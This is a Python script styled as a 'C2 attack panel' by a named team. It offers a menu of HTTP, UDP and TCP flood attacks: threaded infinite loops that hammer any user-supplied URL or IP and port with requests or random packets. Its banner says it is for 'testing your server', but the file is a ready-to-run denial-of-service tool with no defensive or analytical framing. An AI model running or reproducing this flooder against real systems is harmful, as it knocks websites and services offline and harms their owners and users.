import random
import socket
import threading
import platform
import requests
import time
import os

# تهيئة التيرمنال
if platform.system() == 'Windows':
    os.system("cls")
else:
    os.system("clear")

# Banner C2
banner = r"""
╔══════════════════════════════════════════════╗
║        TEAM LFARA3INA – C2 ATTACK PANEL     ║
╠══════════════════════════════════════════════╣
║ Author  : Padre & LineX                     ║
║ Version : V1.0                              ║
║ Use     : Testing Your Server or Website    ║
╚══════════════════════════════════════════════╝
"""
print(banner)

def menu():
    print("""
╔═══════════════════════╗
║      MAIN MENU        ║
╠═══════════════════════╣
║ [1] HTTP Flood (Site) ║
║ [2] UDP Attack (IP)   ║
║ [3] TCP Attack (IP)   ║
║ [0] Exit              ║
╚═══════════════════════╝
""")

menu()
option = input("[?] Select Option: ")

# HTTP FLOOD
if option == "1":
    url = input("[+] Target URL (with http/https): ").strip()
    threads = int(input("[+] Threads: "))
    times = int(input("[+] Requests per thread: "))

    def attack_http():
        while True:
            try:
                for _ in range(times):
                    r = requests.get(url)
                    print(f"[HTTP] Sent --> {url} [{r.status_code}]")
            except:
                print("[HTTP] Failed to reach target.")

    print(f"\n[!] Starting HTTP Flood on: {url}\n")
    for i in range(threads):
        t = threading.Thread(target=attack_http)
        t.start()

# UDP FLOOD
elif option == "2":
    ip = input("[+] Target IP: ")
    port = int(input("[+] Port: "))
    threads = int(input("[+] Threads: "))
    times = int(input("[+] Packets per thread: "))

    def run_udp():
        data = random._urandom(2048)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip), int(port))
                for _ in range(times):
                    s.sendto(data, addr)
                print(f"[UDP] Flooding {ip}:{port}")
            except:
                print("[UDP] Error sending packet.")

    print(f"\n[!] Starting UDP Flood on: {ip}:{port}\n")
    for y in range(threads):
        th = threading.Thread(target=run_udp)
        th.start()

# TCP FLOOD
elif option == "3":
    ip = input("[+] Target IP: ")
    port = int(input("[+] Port: "))
    threads = int(input("[+] Threads: "))
    times = int(input("[+] Packets per thread: "))

    def run_tcp():
        data = random._urandom(1024)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                for _ in range(times):
                    s.send(data)
                print(f"[TCP] Flooding {ip}:{port}")
            except:
                s.close()
                print("[TCP] Connection closed or failed.")

    print(f"\n[!] Starting TCP Flood on: {ip}:{port}\n")
    for y in range(threads):
        th = threading.Thread(target=run_tcp)
        th.start()

# Exit
elif option == "0":
    print("[-] Exiting C2 Panel...")

else:
    print("[!] Invalid Option.")